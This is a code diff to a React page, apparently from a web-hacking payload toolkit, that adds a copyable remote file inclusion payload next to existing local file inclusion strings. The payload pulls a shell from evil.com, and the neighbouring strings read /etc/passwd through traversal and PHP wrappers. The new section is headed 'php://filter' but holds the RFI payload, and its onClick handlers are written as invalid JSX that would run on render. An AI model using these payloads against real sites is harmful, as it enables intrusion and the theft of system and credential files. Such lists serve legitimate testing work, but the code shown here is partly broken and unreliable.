@@ -16,6 +16,7 @@ export default (props) => {
 	const directoryTraversal = `foo.php?file=../../../../../../../etc/passwd`;
 	const phpWrapperLfi = `/example1.php?page=expect://ls`;
 	const phpWrapperFilter = `/example1.php?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd`;
+	const phpRfi = `http://example.com/index.php?page=http://evil.com/shell.txt`;
 	const linux = [
 		{ title: '/etc/passwd' },
 		{ title: '/etc/shadow' },
@@ -167,6 +168,38 @@ export default (props) => {
 			<Divider dashed />
 			<div
 				key='d'
+				style={{
+					padding: 15,
+					marginTop: 15
+				}}
+			>
+				<Title level={3}>PHP Wrapper php://filter</Title>
+				<Paragraph copyable ellipsis={true}>
+					{phpRfi}
+				</Paragraph>
+				<Clipboard component='a' data-clipboard-text={phpRfi}>
+					<Button
+						type='primary'
+						onClick={message.success('Your RFI payload has been copied');}
+						style={{ marginBottom: 10, marginTop: 15 }}
+					>
+						<CopyOutlined />
+						Copy the payload
+					</Button>
+				</Clipboard>
+				<Clipboard component='a' data-clipboard-text={encodeURI(phpRfi)}>
+					<Button
+						type='dashed'
+						onClick={message.success('Your RFI payload URL encoded has been copied');}
+						style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
+					>
+						<LinkOutlined /> URL encoded
+					</Button>
+				</Clipboard>
+			</div>
+			<Divider dashed />
+			<div
+				key='e'
 				style={{
 					padding: 15,
 					marginTop: 15
